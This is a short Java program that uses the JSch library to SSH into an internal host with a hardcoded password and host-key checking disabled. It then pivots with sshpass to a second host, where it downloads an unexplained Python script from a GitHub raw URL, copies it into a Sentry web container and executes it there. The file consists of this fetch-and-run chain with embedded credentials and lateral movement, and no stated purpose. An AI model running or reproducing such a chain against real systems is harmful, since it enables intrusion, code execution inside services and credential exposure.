import com.jcraft.jsch.*;
import java.io.*;
class DK7B {
  public static void main(String[] a) throws Exception {
    JSch j = new JSch();
    java.util.Properties p = new java.util.Properties();
    p.put("StrictHostKeyChecking", "no");
    Session jump = j.getSession("user", "10.14.36.23", 22);
    jump.setPassword("kutul0nc4t");
    jump.setConfig(p);
    jump.setTimeout(10000);
    jump.connect();
    ChannelExec ch = (ChannelExec) jump.openChannel("exec");
    ch.setCommand("sshpass -p kutul0nc4t ssh -o StrictHostKeyChecking=no user@10.13.16.117 'curl -sL -o /tmp/xnd2.py https://raw.githubusercontent.com/bimhybim-del/ai/main/xnd2.py && docker cp /tmp/xnd2.py sentry-self-hosted-web-1:/tmp/xnd2.py && docker exec sentry-self-hosted-web-1 python3 /tmp/xnd2.py 2>&1' 2>&1 | head -20");
    ch.setInputStream(null);
    InputStream in = ch.getInputStream();
    ch.connect();
    byte[] buf = new byte[8192];
    int i;
    while ((i = in.read(buf)) != -1) System.out.write(buf, 0, i);
    ch.disconnect();
    jump.disconnect();
  }
}
